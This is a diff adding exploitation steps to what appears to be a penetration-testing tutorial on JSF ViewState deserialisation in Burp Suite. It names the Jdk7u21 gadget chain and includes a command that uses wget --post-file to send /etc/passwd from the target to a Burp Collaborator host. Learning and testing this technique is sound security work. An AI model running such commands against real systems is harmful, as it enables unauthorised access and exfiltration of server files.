@@ -154,3 +154,23 @@ Step 4: If the viewstate is vulnerable, it will show **Potentially VULNERABLE!!!
 <p align="center">
   <img src="/images/deserialisation/desc18.png">
 </p>
+
+Step 5: Now we got the payload type which is **Jdk7u21** 
+
+<p align="center"><strong>Exploitation</strong></p>
+
+NOTE: There are two ways to Exploit a JSF Viewstate Deserialisation
+
+* Out-Of-Band 
+* Reverse Shell
+
+Step 1: Send the vulnerable request to **DS - Exploitation Tab**
+
+Step 2: Using the following command to perform a **OOB Deserialisation** and Read Internal Files of the application
+
+```bash Jdk7u21 "wget --post-file /etc/passwd  http://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.burpcollaborator.net"```
+
+<p align="center">
+  <img src="/images/deserialisation/desc19.png">
+</p>
+
